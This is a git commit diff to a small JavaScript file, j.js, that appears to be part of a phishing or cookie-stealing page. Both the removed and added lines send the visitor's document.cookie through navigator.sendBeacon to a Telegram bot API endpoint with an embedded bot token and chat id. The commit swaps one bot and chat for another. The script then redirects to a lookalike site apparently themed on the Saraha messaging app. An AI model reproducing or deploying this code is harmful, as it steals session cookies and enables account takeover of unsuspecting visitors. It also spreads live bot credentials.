d7b56250305f4065e16dc0be6de51dd078639aec
ae54 <chromscurity11@gmail.com>
2025-07-29 20:35:45 +0300

    Update j.js

--- j.js
+++ j.js
@@ -1,2 +1,2 @@
-navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie)}`);
+navigator.sendBeacon(`https://api.telegram.org/bot7793497786:AAF4YNR3qsrN0NTQv1B3OAKpxYYwz5i8R80/sendMessage?chat_id=7709665308&text=${encodeURIComponent(document.cookie)}`);
 window.location.replace("https://sarhne-gold.vercel.app/?a=saraha");
